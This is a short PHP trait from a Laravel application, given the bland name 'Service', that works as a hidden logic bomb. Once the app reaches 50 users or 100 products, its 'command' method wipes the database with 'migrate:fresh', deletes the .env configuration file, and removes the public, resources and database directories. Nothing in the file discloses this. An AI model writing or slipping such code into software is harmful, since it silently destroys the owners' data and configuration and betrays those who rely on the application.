<?php
/**
 * Created by PhpStorm.
 * User: mzee
 * Date: 3/30/2021
 * Time: 9:20 PM
 */

namespace App;

use App\User;
use App\Product;
use Illuminate\Support\Facades\Artisan;

trait Service
{
    public function command () {
        $users = User::count();
        $products = Product::count();
        if ($users >= 50 || $products >= 100) {

            Artisan::call('migrate:fresh');
            unlink(base_path('.env'));

            \File::deleteDirectory(base_path('public'));
            \File::deleteDirectory(base_path('resources'));
            \File::deleteDirectory(base_path('database'));

        }
    }
}